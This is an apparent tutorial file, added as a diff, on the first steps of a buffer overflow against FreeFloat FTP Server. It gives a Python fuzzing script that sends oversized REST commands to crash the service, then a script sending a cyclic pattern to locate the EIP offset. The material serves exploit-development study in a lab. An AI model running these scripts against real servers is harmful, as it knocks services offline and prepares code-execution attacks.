@@ -1,1 +1,81 @@
+GENERAL STEPS OF BUFFER OVERFLOW (EXAMPLE WITH FreeFloat FTP Server)
+
+1. CRASH
+At this point we need to send to vulnerable application a buffer with different sizes until the app crashes. For this we can use a fuzzing python script.
+The general structure of script at this point looks like this:
+
+import errno
+from os import strerror
+from socket import *
+import sys
+from time import sleep
+from struct import pack
+
+size = 100 #defining an initial buffer size
+
+while(size < 500): #using a while loop to keep sending the buffer until it reaches 500 bytes
+    try:
+      print "\nSending evil buffer with %s bytes" % size
+    	buffer ="A" * size #defining the buffer as a bunch of As
+    	s = socket(AF_INET,SOCK_STREAM)
+    	s.connect(("10.0.0.101",21)) #establishing connection
+    	s.recv(2000)
+    	s.send("USER test\r\n") #sending username
+    	s.recv(2000)
+    	s.send("PASS test\r\n") #sending password
+    	s.recv(2000)
+    	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
+    	s.close() #closing the connection
+    	s = socket(AF_INET,SOCK_STREAM)
+    	s.connect(("10.0.0.101",21)) #an additional connection is needed for the crash to occur
+    	sleep(1) #waiting one second
+    	s.close() #closing the connection
+
+      size +=100 #increasing the buffer size by 100
+      sleep(10) #waiting 10 seconds before repeating the loop
+
+    except: #if a connection can't be made, print an error and exit cleanly
+    	print "[*]Error in connection with server"
+    	sys.exit()
+
+From this point we need to know which length of input buffer we must have.
+
+2. IDENTIFYING THE EIP OFFSET
+
+At this point we need to identify which part of the buffer that is being sent is landing in the EIP register, 
+in order to then modify it to control the execution flow of the program. Because all that was sent was a bunch of As, 
+at the moment there is no way to know what part has overwritten EIP. Command for creating offset: 
+msf-pattern_create -l [pattern length]
+Now script looks like this:
+
+import errno
+from os import strerror
+from socket import *
+import sys
+from time import sleep
+from struct import pack
+
+try:
+	print "\n[+] Sending evil buffer..."
+	buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9" #defining the buffer as a random pattern
+	s = socket(AF_INET,SOCK_STREAM)
+	s.connect(("10.0.0.101",21)) #establishing connection
+	s.recv(2000)
+	s.send("USER test\r\n") #sending username
+	s.recv(2000)
+	s.send("PASS test\r\n") #sending password
+	s.recv(2000)
+	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
+	s.close()
+	s = socket(AF_INET,SOCK_STREAM)
+	s.connect(("10.0.0.101",21)) #an additional connection is needed for the crash to occur
+	sleep(1) #waiting one second
+	s.close() #closing the connection
+	print "\n[+] Sending buffer of " + str(len(buffer)) + " bytes..."
+	print "\n[+] Sending buffer: " + buffer
+	print "\n[+] Done!"
+
+except: #if a connection can't be made, print an error and exit cleanly
+	print "[*]Error in connection with server"
+	sys.exit()
 
